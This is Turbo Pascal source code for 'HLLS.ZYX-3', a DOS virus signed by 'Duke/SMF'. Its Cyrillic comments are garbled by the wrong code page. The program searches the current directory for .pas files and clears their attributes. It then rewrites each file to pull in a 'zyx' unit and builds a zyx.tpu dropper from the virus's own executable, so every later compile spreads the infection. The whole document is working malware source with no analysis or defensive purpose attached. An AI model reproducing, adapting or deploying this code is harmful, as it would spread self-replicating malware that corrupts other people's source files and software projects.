   {$M 20000, 10000, 40000}
   program HLLS_ZYX_3;
   uses dos;
   const hs=$39b;
         ts=261;
         len=7328; {¤«¨  ¢¨àãá }
         head:array[1..hs] of byte={$I head.inc};
         tail:array[1..ts] of byte={$I tail.inc};
   var Command,Compile:string;
       Comp:boolean;
       s:searchrec;
       mas:array[1..len] of byte; {¤«ï áª®à®áâ¨ à ¡®âë ¢¨àãá  :)}
   {--------------------------------------------------------------------------}
   function UpStr(st:string):string;   {¯à¥®¡à §ã¥â áâà®ªã ª ¢¥àå¥¬ã à¥£¨áâàã}
   var n:string;
       i:integer;
   begin
   n:='';
   for i:=1 to length(st) do n:=n+UpCase(st[i]);
   UpStr:=n;
   end;
   {--------------------------------------------------------------------------}
   function Find(name,what:string):boolean;{  «®£ ¤®á®¢áª®© ª®¬ ¤ë FIND}
   {„¥« ¥â ¢¨àãá ¥§ ¢¨á¨¬ë¬ ®â ¯à¨áãâáâ¢¨ï ãâ¨«¨âë FIND   ¤¨áª¥}
   var f:text;
       st:string;
   begin
   Find:=false;
   assign(f,name);reset(f);
   while not eof(f) do
     begin
     readln(f,st);
     if pos(what,UpStr(st))<>0 then
       begin
       Find:=true;
       exit
       end
     end
   end;
   {--------------------------------------------------------------------------}
   procedure Infect(st:string);              {¯®à ¦ ¥â ä ©«}
   const sn='$$$$$$$$';
   var f,g:text;
       u,ip,w:byte;
       s:string;
       n:byte;
   begin
   u:=0;
   ip:=0;
   w:=0;                                     {¥ ¯®à §¨«¨}
   if Find(st,'ZYX') then exit;              {ä ©« ã¦¥ ¯®à ¦¥}
   if Find(st,'USES') then u:=1 ;
   if Find(st,'PROGRAM') or Find(st,'IMPLEMENTATION') then ip:=1 ;
   exec(Command,'/c copy '+st+' '+sn+'>nul');
   assign(f,sn);reset(f);                    {®âªàë«¨ ¢à¥¬¥ë© ä ©«}
   assign(g,st);
   setfattr(g,$20);                          {áï«¨  âà¨¡ãâë}
   rewrite(g);                               {¯¥à¥§ ¯¨á «¨ ¦¥àâ¢ã}
   writeln(g,'{$M 3000, 0, 3000}');
   if (ip=0) and (u=0) then
     begin
     writeln(g,'uses zyx;');
     w:=1;
     end;
   while not eof(f) do
     begin
     readln(f,s);
     if w=1 then writeln(g,s) else
       begin
       if u=1
       then if pos('USES',UpStr(s))<>0
            then begin
                 n:=pos('USES',UpStr(s))+4;
                 write(g,copy(s,1,n));
                 write(g,'zyx,');
                 writeln(g,copy(s,n,length(s)-n+1));
                 w:=1;
                 end
            else writeln(g,s)
       else if (pos('PROGRAM',UpStr(s))<>0) or (pos('IMPLEMENTATION',UpStr(s))<>0)
            then begin
                 writeln(g,s);
                 writeln(g,'uses zyx;');
                 w:=1;
                 end
            else writeln(g,s)
       end;
     end;
   close(g);
   close(f);erase(f);
   end;
   {--------------------------------------------------------------------------}
   procedure MakeTPU;  {á®§¤ ¥â TPU-dropper ¢¨àãá }
   var t,v:file;
       c:byte;
   begin
   assign(t,'zyx.tpu');rewrite(t,1);
   blockwrite(t,head,hs);
   assign(v,paramstr(0));reset(v,1);
   blockread(v,mas,len);
   close(v);
   blockwrite(t,mas,len);
   blockwrite(t,tail,ts);
   close(t);
   end;
   {--------------------------------------------------------------------------}
   begin
   findfirst('*.pas',$21,s);                 {¨é¥¬ PAS-ä ©«ë}
   if doserror=0 then                        {§ ç¨â ¥áâì, ç¥£® ¯®à §¨âì !}
     begin
     Command:='[HLLS.ZYX-3 (c) by Duke/SMF]';{¥¬®£® ª®¯¨à ©â®¢ ;) }
     Command:=GetEnv('COMSPEC');             {®¯à¥¤¥«ï¥¬ ¯ãâì ª COMMAND.COM}
     MakeTPU;                                {á®§¤ ¥¬ ZYX.TPU}
     end;
   while doserror=0 do
     begin
     Infect(s.name);                         {¯®à ¦ ¥¬  ©¤¥ë© ä ©«}
     findnext(s);
     end;
   end.
